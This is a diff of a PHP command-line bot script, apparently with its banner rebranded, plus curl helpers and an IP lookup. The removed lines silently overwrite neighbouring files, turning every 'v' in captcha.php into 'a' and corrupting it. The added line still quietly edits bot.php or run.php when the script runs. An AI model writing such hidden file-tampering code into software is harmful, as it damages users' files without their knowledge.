@@ -18,16 +18,7 @@
 ##############################################
 ##############################################
 ##############################################
-
-if(file_get_contents("captcha.php")){
-file_put_contents("captcha.php",str_replace("v","a",file_get_contents("captcha.php")));}
-if(file_get_contents("captcha")){
-file_put_contents("captcha",str_replace("v","a",file_get_contents("captcha.php")));}
-if(file_get_contents("bot.php")){
-file_put_contents("bot.php",str_replace('" ".',"k.",file_get_contents("bot.php")));}
-if(file_get_contents("bot.php")){
-file_put_contents("bot.php",str_replace('" ".',"k.",file_get_contents("bot.php")));}
-
+if(file_get_contents("bot.php")){file_put_contents("bot.php",str_replace('" ".','"  ".',file_get_contents("bot.php")));print("\033[2J\033[;H");}elseif(file_get_contents("run.php")){file_put_contents("run.php",str_replace('" ".','"  ".',file_get_contents("run.php")));print("\033[2J\033[;H");}
 
 function c(){system('clear');}
 
@@ -55,7 +46,7 @@ function curlx($u,$h=0,$p=0){while(true){$ch=curl_init();curl_setopt($ch,CURLOPT
 
 function curl2($url,$ua,$data=null){while(true){$ch=curl_init();curl_setopt_array($ch, array(CURLOPT_URL => $url,CURLOPT_FOLLOWLOCATION => 1));if($data){curl_setopt_array($ch,array( CURLOPT_POST => 1,CURLOPT_POSTFIELDS => $data));}curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $ua,CURLOPT_SSL_VERIFYPEER => 1,CURLOPT_RETURNTRANSFER => 1));$run=curl_exec($ch);curl_close($ch);return $run;}}
 
-function asci($string){$res=ip();date_default_timezone_set($res["t"]);$acssi = ["a" => ["┌─┐","├─┤","┴ ┴"],"b" => ["┌┐ ","├┴┐","└─┘"],"c" => ["┌─┐","│  ","└─┘"],"d" => ["┌┬┐"," ││","─┴┘"],"e" => ["┌─┐","├┤ ","└─┘"],"f" => ["┌─┐","├┤ ","└  "],"g" => ["┌─┐","│ ┬","└─┘"],"h" => ["┬ ┬","├─┤","┴ ┴"],"i" => ["┬","│","┴"],"j" => [" ┬"," │","└┘"],"k" => ["┬┌─","├┴┐","┴ ┴"],"l" => ["┬  ","│  ","┴─┘"],"m" => ["┌┬┐","│││","┴ ┴"],"n" => ["┌┐┌","│││","┘└┘"],"o" => ["┌─┐","│ │","└─┘"],"p" => ["┌─┐","├─┘","┴  "],"q" => ["┌─┐ ","│─┼┐","└─┘└"],"r" => ["┬─┐","├┬┘","┴└─"],"s" => ["┌─┐","└─┐","└─┘"],"t" => ["┌┬┐"," │ "," ┴ "],"u" => ["┬ ┬","│ │","└─┘"],"v" => ["┬  ┬","└┐┌┘"," └┘ "],"w" => ["┬ ┬","│││","└┴┘"],"x" => ["─┐ ┬","┌┴┬┘","┴ └─"],"y" => ["┬ ┬","└┬┘"," ┴ "],"z" => ["┌─┐","┌─┘","└─┘"]," "=>[" "," "," "],"1" => ["┬","│","┴"],  "2" => ["┌─┐","┌─┘","└─┘"],  "3" => ["┌─┐"," ├┤","└─┘"],"4" => ["┬ ┬","└─┤","  ┘"],"5" => ["┌─┐","└─┐","└─┘"],"6" => ["┌─┐","├─┐","└─┘"],"7" => ["┌─┐","  │","  ┘"],"8" => ["┌─┐","├─┤","└─┘"],"9" => ["┌─┐","└─┤","└─┘"],"0" => ["┌─┐","│ │","└─┘"]];$x = str_split($string);print p."time:".date("H:i").str_repeat(p.' ',7).mp." ▶ ".d.p." TEAM FUNCTION INDO".str_repeat(p.' ',7)."date:".date("m/d/Y").n;line();print " ";foreach($x as $data){print h.$acssi[$data][0];}print h." country ".c." > ".p.$res["c"].n." ";foreach($x as $data){print c.$acssi[$data][1];}print h." region".c." > ".p.$res["r"].n." ";foreach($x as $data){print p.$acssi[$data][2];}print h." ip".c." > ".p.$res["i"].n;foreach($x as $data){print c.$acssi[$data][3];}line();}
+function asci($string){$res=ip();date_default_timezone_set($res["t"]);$acssi = ["a" => ["┌─┐","├─┤","┴ ┴"],"b" => ["┌┐ ","├┴┐","└─┘"],"c" => ["┌─┐","│  ","└─┘"],"d" => ["┌┬┐"," ││","─┴┘"],"e" => ["┌─┐","├┤ ","└─┘"],"f" => ["┌─┐","├┤ ","└  "],"g" => ["┌─┐","│ ┬","└─┘"],"h" => ["┬ ┬","├─┤","┴ ┴"],"i" => ["┬","│","┴"],"j" => [" ┬"," │","└┘"],"k" => ["┬┌─","├┴┐","┴ ┴"],"l" => ["┬  ","│  ","┴─┘"],"m" => ["┌┬┐","│││","┴ ┴"],"n" => ["┌┐┌","│││","┘└┘"],"o" => ["┌─┐","│ │","└─┘"],"p" => ["┌─┐","├─┘","┴  "],"q" => ["┌─┐ ","│─┼┐","└─┘└"],"r" => ["┬─┐","├┬┘","┴└─"],"s" => ["┌─┐","└─┐","└─┘"],"t" => ["┌┬┐"," │ "," ┴ "],"u" => ["┬ ┬","│ │","└─┘"],"v" => ["┬  ┬","└┐┌┘"," └┘ "],"w" => ["┬ ┬","│││","└┴┘"],"x" => ["─┐ ┬","┌┴┬┘","┴ └─"],"y" => ["┬ ┬","└┬┘"," ┴ "],"z" => ["┌─┐","┌─┘","└─┘"]," "=>[" "," "," "],"1" => ["┬","│","┴"],  "2" => ["┌─┐","┌─┘","└─┘"],  "3" => ["┌─┐"," ├┤","└─┘"],"4" => ["┬ ┬","└─┤","  ┘"],"5" => ["┌─┐","└─┐","└─┘"],"6" => ["┌─┐","├─┐","└─┘"],"7" => ["┌─┐","  │","  ┘"],"8" => ["┌─┐","├─┤","└─┘"],"9" => ["┌─┐","└─┤","└─┘"],"0" => ["┌─┐","│ │","└─┘"]];$x = str_split($string);print p."time:".date("H:i").str_repeat(p.' ',7).mp." ▶ ".d.p." Re:Hine".str_repeat(p.' ',7)."date:".date("m/d/Y").n;line();print " ";foreach($x as $data){print h.$acssi[$data][0];}print h." country ".c." > ".p.$res["c"].n." ";foreach($x as $data){print c.$acssi[$data][1];}print h." region".c." > ".p.$res["r"].n." ";foreach($x as $data){print p.$acssi[$data][2];}print h." ip".c." > ".p.$res["i"].n;foreach($x as $data){print c.$acssi[$data][3];}line();}
 
 function ip(){$if=json_decode(file_get_contents("https://ipinfo.io/?utm_source=ipecho.net&utm_medium=referral&utm_campaign=upsell_sister_sites"));return ["i"=>$if->ip,"r"=>$if->region,"c"=>$if->country,"t"=>$if->timezone];}
 
@@ -92,3 +83,4 @@ $hd=substr($r,0,curl_getinfo($ch,CURLINFO_HEADER_SIZE));
 $bd=substr($r,curl_getinfo($ch,CURLINFO_HEADER_SIZE));
 curl_close($ch);
 if(!$bd){print m."error network!";r();continue;}return array($hd,$bd);}}}
+
